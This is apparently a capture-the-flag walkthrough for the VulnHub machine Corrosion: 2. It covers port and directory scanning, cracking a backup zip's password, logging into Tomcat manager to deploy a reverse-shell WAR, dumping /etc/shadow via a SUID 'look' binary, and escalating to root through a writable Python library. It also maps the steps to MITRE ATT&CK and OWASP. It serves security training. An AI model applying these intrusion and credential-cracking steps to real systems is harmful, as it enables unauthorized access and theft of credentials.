## Corrosion2


| **Platform**   | VulnHub          |
| -------------- | ---------------- |
| **Machine**    | Corrosion: 2     |
| **Creator**    | Proxy Programmer |
| **OS**         | Linux            |
| **Difficulty** | Medium           |

use `netdiscover` to find the target VM, then use `Nmap`.

```
nmap -sV -sC 10.0.2.26
```

| Port | Service | Details                                                      |
| ---- | ------- | ------------------------------------------------------------ |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80   | HTTP    | Apache httpd 2.4.41 ((Ubuntu))<br>                           |
| 8080 | HTTP    | Apache Tomcat (language: en)                                 |

there's no apparent avenues on port 80, so lets focus on the Apache Tomcat on port 8080.

<img width="1465" height="757" alt="image" src="https://github.com/user-attachments/assets/54e73241-cc98-44eb-a819-ba60dfcdb78d" />

 
 use `gobuster` for enumeration (while waiting, we can play snake in `/examples/websocket/snake.xhtml`).
 
~~~
gobuster dir -u http://10.0.2.26:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,cgi,xml,zip 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.26:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,txt,js,cgi,xml,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
docs                 (Status: 302) [Size: 0] [--> /docs/]
examples             (Status: 302) [Size: 0] [--> /examples/]
backup.zip           (Status: 200) [Size: 33723]
readme.txt           (Status: 200) [Size: 153]
manager              (Status: 302) [Size: 0] [--> /manager/]
RELEASE-NOTES.txt    (Status: 200) [Size: 6898]
Progress: 1764464 / 1764464 (100.00%)
===============================================================
Finished
===============================================================

~~~

immediately interesting is the `backup.zip` file. after downloading we can try unzipping it and notice it requires a password. use `zip2john` and `johntheripper` for bruteforcing.
meanwhile in `/readme.txt/` we see a potential user **randy**, and a mention of a file on the server that no one is supposed to find (probably the backup file we already found).

~~~
zip2john backup.zip > hash_backup.txt


john --wordlist=/usr/share/wordlists/rockyou.txt hash_backup.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
@administrator_hi5 (backup.zip)     
1g 0:00:00:00 DONE (2026-11-09 16:29) 1.064g/s 12235Kp/s 12235Kc/s 12235KC/s @lexutz..9StephiOlarte
Use the "--show" option to display all of the cracked passwords reliably
Session completed

~~~

in `tomcat-users.xml`:

~~~xml
-->
<role rolename="manager-gui"/>
<user username="manager" password="melehifokivai" roles="manager-gui"/>
<role rolename="admin-gui"/>
<user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>
</tomcat-users>
~~~

use these credentials to log into `/manager/html`. 


<img width="1465" height="757" alt="image" src="https://github.com/user-attachments/assets/0a95947a-bcd4-4e37-ac56-ee61f5e60463" />


there is an option to deploy a WAR file. use `msfvenom` to [create a reverse shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#war), and deploy it. use `pty` to make the experience more pleasant, navigate to `/home/randy` and get the user flag.

~~~
tomcat@corrosion:/home/randy$ cat user.txt
cat user.txt
~~~

check for password reuse for both **randy** and **jaye**, with one of them being successful.

~~~
tomcat@corrosion://home/randy$ su jaye
su jaye
Password: melehifokivai

$ whoami
whoami
jaye
~~~

now we can `ssh` as **jaye**. 

in `/etc/` we can see `shadow`, which stores user account information including hashed passwords, but we lack permissions to open it. 

however, previously we've found something we can use:

~~~
jaye@corrosion:~/Files$ ls -la
total 24
drwxr-xr-x  2 root root  4096 Sep 17  2021 .
drwxr-x--x 18 jaye jaye  4096 Sep 17  2021 ..
---s--s--x  1 root root 14728 Sep 17  2021 look
~~~

this binary allows us to [see all lines that start with a specific string inside of a file](https://man7.org/linux/man-pages/man1/look.1.html). 

so, if we set an empty string, it shows all the lines :)

~~~
jaye@corrosion:/etc$ ~/Files/look '' shadow
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
daemon:*:18858:0:99999:7:::
====Shortened===
sssd:*:18858:0:99999:7:::
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
systemd-coredump:!!:18886::::::
tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
sshd:*:18887:0:99999:7:::
jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::
~~~

use `john` to crack **randy**'s password, and `su` to him.
~~~
john --wordlist=/usr/share/wordlists/rockyou.txt randy_hash.txt
~~~

list permissions

~~~
randy@corrosion:~$ sudo -l
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py

~~~

sadly, we can't edit the `randombase64.py` file directly, but if look closer it uses the `base64` library. 

navigate to `/usr/lib/python3.8`, and sure enough, `base64.py` is writeable.

~~~sh
-rwxrwxrwx   1 root root  20386 Sep 20  2021 base64.py
~~~

modify the file

<img width="1188" height="782" alt="image" src="https://github.com/user-attachments/assets/c3a74d0f-c693-4619-819f-b2bdcc8dce9f" />


and run the command with `sudo` to get the **root** flag.

~~~
randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
root@corrosion:/home/randy# cd ~
root@corrosion:~# cat root.txt
~~~


#### MITRE ATT&CK Mapping

| **Actions**           | **Step**                                                               | **Technique**                                                                              |
| --------------------- | ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| Service discovery     | Scan with Nmap                                                         | T1595 Active scanning                                                                      |
| Web content discovery | Directory enumeration with Gobuster                                    | T1595.003 Active Scanning: Wordlist Scanning                                               |
| Access hidden file    | Access `/backup.zip`                                                  | T1594 Search Victim-Owned Websites                                                         |
| Credential Access     | Bruteforce password to `backup.zip`                                    | T1110.001 Brute Force: Password Guessing                                                   |
| Credential Access     | Get manager credentials                                                | T1552.001 Unsecured Credentials: Credentials in Files                                      |
| Initial Access        | Reverse shell                                                          | T1078.003 Valid Accounts: Local Accounts<br>T1505.003 Server Software Component: Web Shell |
| Stealth               | Use `look` to read `/etc/shadow`                                       | T1202 Indirect Command Execution                                                           |
| Credential Access     | use `johntheripper` to crack **randy**'s password                      | T1110.002 Brute Force: Password Cracking                                                   |
| Privilege Escalation  | `su randy`                                                             | T1078.003 Valid Accounts: Local Accounts                                                   |
| Privilege Escalation  | inject command into `base64.py` to spawn interactive shell as **root** | T1059.006 Command and Scripting Interpreter: Python                                        |


#### OWASP Vulnerability Table

| **Vulnerability**     | **Impact**                                                                                                                                                                                                |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Broken Access Control | `backup.zip`  findable and downloadable, with unsecured credentials; `look` binary used to bypass user permissions; `randombase64.py` used to spawn interactive shell as **root** via editing `base64.py` |

